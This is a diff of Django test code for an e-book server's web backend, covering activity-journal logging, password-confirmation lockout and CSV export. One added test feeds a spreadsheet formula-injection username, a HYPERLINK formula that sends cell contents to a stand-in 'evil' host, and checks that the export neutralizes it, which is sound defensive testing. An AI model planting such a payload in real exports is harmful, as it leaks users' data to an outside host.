@@ -403,7 +403,8 @@ def test_user_management_names_who_and_whom(boss):
     admin, client = boss
     client.post(reverse("web:user_create"), {"username": "anna", "password": PASSWORD, "role": "user"})
     anna = User.objects.get(username="anna")
-    client.post(reverse("web:user_edit", args=[anna.pk]), {"role": "superuser", "max_devices": "3"})
+    client.post(reverse("web:user_edit", args=[anna.pk]), {"role": "superuser", "max_devices": "3",
+                                                           "confirm_password": PASSWORD + "Aa1"})
     client.post(reverse("web:user_delete", args=[anna.pk]))
     events = list(ActivityEvent.objects.filter(category="accounts").order_by("id"))
     assert [e.action for e in events] == ["user_created", "device_limit_changed", "role_changed", "user_deleted"]
@@ -562,6 +563,22 @@ def test_csv_export_follows_filters_and_is_superuser_only():
     assert ",anna," in lines[1] and "Failed sign-in" in lines[1] and "wrong_password" in lines[1]
 
 
+def test_csv_export_neutralizes_formulas():
+    """Имя из неудачного входа набирает кто угодно, название книги — из FB2:
+    «=HYPERLINK(…)» в выгрузке не должно стать формулой в Excel."""
+    import csv
+    import io
+    admin = User.objects.create_superuser("admin", password=PASSWORD + "Aa1")
+    activity.record(None, "login_failed", user=None, username='=HYPERLINK("https://evil/?"&A2,"x")',
+                    ok=False, channel="web", reason="unknown_user")
+    client = Client()
+    client.force_login(admin)
+    response = client.get(reverse("web:journal"), {"format": "csv", "failed": "1", "period": "all"})
+    rows = list(csv.reader(io.StringIO(b"".join(response.streaming_content).decode("utf-8-sig"))))
+    assert rows[1][1] == "'=HYPERLINK(\"https://evil/?\"&A2,\"x\")"
+    assert not any(cell.startswith(("=", "+", "-", "@")) for row in rows[1:] for cell in row)
+
+
 def test_detail_codes_are_shown_as_text_of_their_own_key():
     """«telegram» — и способ входа, и вкладка настроек: у каждого ключа свой текст."""
     from django.utils import translation
@@ -572,3 +589,20 @@ def test_detail_codes_are_shown_as_text_of_their_own_key():
         assert dict(activity.detail_rows(login))["Как"] == "пароль и код из Telegram"
         rows = {str(k): str(v) for k, v in activity.detail_rows(saved)}
         assert rows["Вкладка"] == "Telegram" and rows["Изменения"] == "telegram_channel: a → b"
+
+
+def test_wrong_confirmation_passwords_are_recorded_and_lock():
+    """Неверный пароль при подтверждении действия в профиле — в журнал
+    (без самого пароля); набралось на блокировку — и она, и в сводке дня."""
+    from sopds_web_backend.password_rules import PASSWORD_MAX_FAILURES
+    user = User.objects.create_user("anna", password=PASSWORD)
+    client = Client()
+    _login(client, "anna")
+    for i in range(PASSWORD_MAX_FAILURES):
+        client.post(reverse("web:profile"), {"action": "opds_new", "confirm_password": f"secret-guess-{i}"})
+    actions = _actions(user)
+    assert actions.count("password_wrong") == PASSWORD_MAX_FAILURES
+    assert actions.count("password_locked") == 1
+    assert not any("secret-guess" in str(e.details) for e in ActivityEvent.objects.all())
+    summary = activity.summary_today()
+    assert summary["failed"] >= PASSWORD_MAX_FAILURES and summary["locks"] == 1
